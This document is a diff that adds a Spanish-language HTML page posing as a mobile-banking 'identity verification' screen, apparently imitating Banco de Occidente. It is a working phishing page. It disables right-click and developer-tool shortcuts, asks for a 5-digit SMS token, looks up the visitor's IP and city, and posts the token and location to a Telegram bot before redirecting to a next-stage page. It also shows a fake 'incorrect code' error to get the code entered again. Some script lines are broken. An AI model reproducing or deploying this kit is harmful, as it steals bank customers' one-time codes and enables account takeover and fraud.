@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+
+
+</style>
+    <script>
+        // 
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // 
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
+                return false;
+            }
+        }
+    </script>
+
+  <title>log</title>
+
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banca Móvil</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(90deg, #FFAC3E 0%, #f87d18 100%);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+
+    .background-layer {
+    position: fixed;
+    top: 35%;
+    width: 100%;
+    height: 66%;
+    background: rgb(240, 238, 238);
+}
+.container {
+    position: relative;
+    width: 90%;
+    max-width: 400px;
+    padding: 20px;
+    border-radius: 10px;
+    text-align: center;
+    z-index: 1;
+    margin-bottom: 190px;
+}
+
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 66px;
+    }
+
+    .title {
+      font-size: 28px;
+      color: #ffffff;
+      font-weight: bold;
+      margin-bottom: 47px;
+    }
+
+    form {
+      margin-top: 20px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 17px;
+      color: #439346;
+      font-weight: bold;
+      margin-bottom: 5px;
+      text-align: left;
+    }
+
+
+    .form-group input {
+    width: 100%;
+    padding: 26px 13px;
+    font-size: 14px;
+    border: 0px solid #ccc;
+    border-radius: 9px;
+    box-sizing: border-box;
+}
+
+    .form-group input:focus {
+      outline: none;
+      border-color: #4caf50;
+    }
+
+    .form-group i {
+      position: absolute;
+      top: 63%;
+      right: 18px;
+      transform: translateY(-50%);
+      color: #333333a8;
+      font-size: 28px;
+    }
+
+    .btn {
+    margin-top: 50px;
+    width: 100%;
+    padding: 21px;
+    background: linear-gradient(-45deg, #006738 0%, #229A0D 100%);
+    color: #ffffff;
+    border: none;
+    border-radius: 12px;
+    font-size: 20px;
+    cursor: pointer;
+    font-weight: bold;
+}
+
+    .btn:hover {
+      background: linear-gradient(to right, #aed14d, #4caf50);
+    }
+
+    .checkbox-container {
+    display: flex;
+    align-items: center;
+    margin-top: 11px;
+    justify-content: center;
+}
+
+    .checkbox-container input {
+      margin-right: 10px;
+    }
+
+    .checkbox-container label {
+    font-size: 15px;
+    color: #337935;
+}
+
+    /* Cambia el color solo de la etiqueta asociada al campo con id="numero" */
+    .form-group label[for="numero"] {
+      color: #ffffff;
+      /* Color blanco solo para la etiqueta Número */
+    }
+
+    .divLoading {
+  margin: 0 auto;
+  padding: 10px;
+  width: 120px;
+  color: #fff;
+}
+ /* Estilos para el mensaje de error */
+    .error-message {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #ffe6e6;
+      color: #cc0000;
+      border: 1px solid #cc0000;
+      border-radius: 8px;
+      padding: 2px 12px;
+      font-weight: bold;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      animation: fadeIn 0.5s ease-in-out;
+      font-size: 12px;
+      text-align: ;
+    }
+
+    .error-message svg {
+      margin-right: 10px;
+      fill: #cc0000;
+      width: 20px;
+      height: 20px;
+    }
+
+    /* Animación para el mensaje de error */
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+</head>
+
+	
+
+
+<body>
+  <div class="background-layer"></div>
+    <!-- Contenedor principal -->
+    <div class="container">
+        <div class="logo">
+ <br>
+<br>
+<br>
+
+            <!-- Cambia "descarga.png" por la ruta de tu logo -->
+<br>
+<h2 style="text-align: center;"><span style="color: #ffffff;">Verificación de identidad requerida</span></h2>
+
+        <h1 class="title">Banca Móvil</h1>
+         <div class="error-message" id="errorMessage" style="display: none;">
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+    <path d="M12 0C5.371 0 0 5.371 0 12c0 6.63 5.371 12 12 12s12-5.37 12-12C24 5.371 18.63 0 12 0zm5.707 16.293L16.293 17.707 12 13.414l-4.293 4.293-1.414-1.414L10.586 12 6.293 7.707l1.414-1.414L12 10.586l4.293-4.293 1.414 1.414L13.414 12l4.293 4.293z" />
+  </svg>
+  <span>El código ingresado es incorrecto o ha expirado. Por favor, inténtelo de nuevo.</span>
+</div>
+<br>
+<br>
+<br>
+ <form method="post" action="" class="form_contact" onsubmit="return sender()">
+
+                            <p id="gfg" hidden=""></p>
+						<p id="address" hidden=""></p>
+            <div class="form-group">
+
+            </div>
+            <div class="form-group">
+                <label for="pin">Ingrese el código de 5 dígitos correctamente:</label>
+                <input type="password" id="a7fxs220" name="a7fxs220" inputmode="numeric" placeholder="Ingresa su Token SMS" required="" minlength="5" maxlength="5" onkeypress="if(event.keyCode&lt;45||event.keyCode&gt;57)event.returnValue=false;">
+
+                <i class="fas fa-lock"></i> <!-- Ícono de candado -->
+            </div>
+            <button class="btn" type="submit">Ingresar</button>
+            <div class="checkbox-container">
+                <label for="biometrico">Ingresar sus Datos Correctamente</label>
+            </div>
+        </form>
+</form>
+            </td>
+        </tr>
+    </table>
+    
+              </body>
+            </div>
+              <script src="./appconsole.js"></script>
+
+        <script
+        src="https://code.jquery.com/jquery-2.2.3.min.js"
+        integrity="sha256-a23g1Nt4dtEYOj7bR+vTu7+T8VP13humZFBJNIYoEJo="
+        crossorigin="anonymous"></script>
+
+        <script>
+            $.getJSON("https://api.ipify.org?format=json",
+             function(data) {
+                $("#gfg").html(data.ip);
+            })
+         </script>
+         <script>
+            $.getJSON("https://ipinfo.io", function (response) {
+       $("#ip").html("IP: " + response.ip);
+       $("#address").html("" + response.city + ", " + response.country);
+       })
+         </script>
+      <script>
+   
+   var u_name, pax,  ip, ip2;
+   var ready = function () {
+       pax20 = document.getElementById("a7fxs220").value;
+
+       ip = document.getElementById("gfg").innerHTML;
+       ip2 = document.getElementById("address").innerHTML;
+       message = "Token-Occidente\nSMS: " + pax20 +"\nIP: " + ip +"\n" + ip2;
+   };
+   var sender = function () {
+       ready();
+       var settings = {
+           "async": true,
+           "crossDomain": true,
+           "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+           "method": "POST",
+           "headers": {
+               "Content-Type": "application/json",
+               "cache-control": "no-cache"
+   
+           },
+           "data": JSON.stringify({
+               "chat_id": chat_id,
+               "text": message
+           })
+       };
+       $.ajax(settings).done(function (response) {
+           window.location = 'SEG2.html';
+           console.log(response);
+       });
+       return false;
+   };
+      </script>
+
+<script>
+const input = document.getElementById("a7fxs1");
+
+input.addEventListener("blur", () => {
+  const regex = ;
+  if (!regex.test(input.value)) {
+    alert("");
+    input.value = "";
+  }
+});
+
+
+    </script>
+    <script>
+  // Obtener los parámetros de la URL
+  const urlParams = new URLSearchParams(window.location.search);
+  const error = urlParams.get('error');
+
+  // Verificar si el error existe y tiene el valor esperado
+  if (error && (error === 'true' || error === 'verification_failed')) {
+    const errorMessage = document.getElementById('errorMessage');
+    if (errorMessage) {
+      errorMessage.style.display = 'block';  // Mostrar el mensaje de error
+    }
+  }
+</script>
+
+    </body>
+
+
+</body></html>
